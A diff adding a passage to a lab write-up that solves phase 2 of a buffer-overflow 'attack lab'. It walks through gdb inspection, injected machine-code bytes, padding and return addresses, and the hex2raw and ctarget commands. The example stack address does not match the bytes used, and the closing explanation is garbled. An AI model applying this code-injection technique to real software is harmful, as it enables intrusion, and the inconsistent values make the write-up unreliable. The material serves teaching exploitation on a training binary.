@@ -92,4 +92,35 @@ After that do:
 x/s $rsp
 ```
 
+You will get something like
+```assembly
+0x55617e98:	"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut a"...
+```
+The address on the left side is what we want => ```0x55617e98```.
+
+Now, create a text file named ```phase2.txt``` which will look something like below and don't forget the bytes for rsp and touch2 go in reverse (little endian).
+
+```
+48 c7 c7 70 4b 4b 43 c3 /*this sets your cookie*/
+00 00 00 00 00 00 00 00 /*padding to make it 24 bytes*/
+00 00 00 00 00 00 00 00 /*padding to make it 24 bytes*/
+d8 0c 62 55 00 00 00 00 /* address of register %rsp */
+8c 17 40 00 00 00 00 00 /*address of touch2 function */
+````
+Run it through ```hex2raw```
+
+```./hex2raw < phase2.txt > raw-phase2.txt```
+
+Finally, you run the raw file
+
+```./ctarget < raw-phase2.txt```
+
+What the exploit does is that first it sets register rdi to our cookie value is transferred to $rsp register so after we enter our string and getbuf tries to return control to the calling function, we want it to point to the rsp address so it will execute the code to set the cookie and finally we call touch2 after the cookie is set.
+
+```ssh
+
+```
+
+
+
 
